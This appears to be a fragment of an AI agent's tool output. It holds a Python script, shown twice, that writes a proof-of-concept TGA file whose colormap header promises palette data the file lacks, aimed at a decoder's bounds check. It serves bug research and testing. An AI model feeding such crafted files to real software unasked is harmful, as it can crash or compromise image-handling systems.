import struct

# TGA Header (18 bytes, little-endian):
id_length = 0
colormap_type = 1  # has colormap
image_type = 1     # TGA_TYPE_INDEXED
colormap_index = 0
colormap_length = 1  # 1 color entry (needs 3 bytes of palette data)
colormap_size = 24   # 24-bit palette entries
x_origin = 0
y_origin = 0
width = 1
height = 1
pixel_size = 8      # 8 bits per pixel (indexed)
flags = 0x20        # origin upper-left

header = struct.pack('<BBBHHBHHHHBB',
    id_length,
    colormap_type,
    image_type,
    colormap_index,
    colormap_length,
    colormap_size,
    x_origin,
    y_origin,
    width,
    height,
    pixel_size,
    flags)

# Add 1 extra byte so atEnd() returns false after seek(18)
# but not enough for palette (needs 3 bytes)
with open('/workspace/poc.tga', 'wb') as f:
    f.write(header + b'\x00')

print(f'Written {len(header)+1} bytes')
"` executed with exit code 0.

import struct
# TGA Header (18 bytes, little-endian):
id_length = 0
colormap_type = 1  # has colormap
image_type = 1     # TGA_TYPE_INDEXED
colormap_index = 0
colormap_length = 1  # 1 color entry (needs 3 bytes of palette data)
colormap_size = 24   # 24-bit palette entries
x_origin = 0
y_origin = 0
width = 1
height = 1
pixel_size = 8      # 8 bits per pixel (indexed)
flags = 0x20        # origin upper-left
header = struct.pack('<BBBHHBHHHHBB',
    id_length,
    colormap_type,
    image_type,
    colormap_index,
    colormap_length,
    colormap_size,
    x_origin,
    y_origin,
    width,
    height,
    pixel_size,
    flags)
# Add 1 extra byte so atEnd() returns false after seek(18)
# but not enough for palette (needs 3 bytes)
with open('/workspace/poc.tga', 'wb') as f:
    f.write(header + b'\x00')
print(f'Written {len(header)+1} bytes')
"
